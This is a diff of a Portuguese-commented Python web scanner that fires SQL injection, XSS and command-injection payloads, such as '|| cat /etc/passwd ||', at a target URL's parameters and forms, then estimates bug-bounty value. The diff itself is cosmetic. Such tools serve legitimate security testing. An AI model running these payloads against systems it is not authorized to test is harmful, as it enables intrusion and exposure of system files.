@@ -13,10 +13,10 @@ HEADER = """
 ██║   ██║██║     ██╔══██║██║   ██║    ╚════██║██║██║     ██╔══╝  ██║╚██╗██║   ██║   
 ╚██████╔╝███████╗██║  ██║╚██████╔╝    ███████║██║███████╗███████╗██║ ╚████║   ██║   
  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝
-by: vendetta the god\033[0m
+\033[0m
 """
 
-# payloads de injeção SQL comuns
+# Lista de payloads de injeção SQL comuns
 sql_payloads = [
     "' OR '1'='1",
     "' OR '1'='1' -- ",
@@ -25,13 +25,13 @@ sql_payloads = [
     "' OR '1'='1' /*'",
 ]
 
-# payloads de XSS comuns
+# Lista de payloads de XSS comuns
 xss_payloads = [
     "<script>alert('XSS')</script>",
     "<img src=x onerror=alert('XSS')>",
 ]
 
-# payloads de RCE comuns
+# Lista de payloads de RCE comuns
 rce_payloads = [
     "|| ls ||",
     "|| cat /etc/passwd ||",
@@ -44,7 +44,7 @@ def find_sql_injection(url):
             vuln_url = urljoin(url, url + '?' + param.split('=')[0] + '=' + payload)
             vuln_response = requests.get(vuln_url)
             if "sql" in vuln_response.text.lower() or "syntax" in vuln_response.text.lower():
-                vulnerabilities.append(f"SQL Injection encontrada: {vuln_url}")
+                vulnerabilities.append("SQL Injection encontrada: {}".format(vuln_url))
     return vulnerabilities
 
 def find_xss(url):
@@ -62,7 +62,7 @@ def find_xss(url):
             data = {input.get('name'): payload for input in inputs if input.get('name')}
             vuln_response = requests.post(form_url, data=data)
             if payload in vuln_response.text:
-                vulnerabilities.append(f"XSS encontrada: {form_url} com payload {payload}")
+                vulnerabilities.append("XSS encontrada: {} com payload {}".format(form_url, payload))
     return vulnerabilities
 
 def find_rce(url):
@@ -71,18 +71,18 @@ def find_rce(url):
         vuln_url = urljoin(url, '?' + payload)
         vuln_response = requests.get(vuln_url)
         if "root:" in vuln_response.text or "/bin" in vuln_response.text:
-            vulnerabilities.append(f"RCE encontrada: {vuln_url}")
+            vulnerabilities.append("RCE encontrada: {}".format(vuln_url))
     return vulnerabilities
 
 def estimate_bounty(vulnerabilities):
     bounty = 0
     for vuln in vulnerabilities:
         if "SQL Injection" in vuln:
-            bounty += 1500  
+            bounty += 1500  # Estimativa para SQL Injection
         elif "XSS" in vuln:
-            bounty += 500  
+            bounty += 500  # Estimativa para XSS
         elif "RCE" in vuln:
-            bounty += 3000  
+            bounty += 3000  # Estimativa para RCE
     return bounty
 
 def main():
